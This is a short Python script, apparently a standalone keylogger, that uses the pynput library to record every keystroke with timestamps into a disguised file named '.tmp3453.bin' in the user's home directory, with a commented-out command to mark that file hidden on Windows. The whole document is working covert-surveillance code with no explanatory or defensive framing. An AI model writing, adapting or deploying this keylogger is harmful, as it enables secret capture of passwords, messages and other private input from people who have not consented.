from pynput.keyboard import Key, Listener
import logging
from os.path import expanduser
import subprocess
home = expanduser("~")

filepath = home + "/.tmp3453.bin"
logging.basicConfig(filename=filepath, level=logging.DEBUG, format='%(asctime)s: %(message)s')
#subprocess.check_call(["attrib","+H",filepath])

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

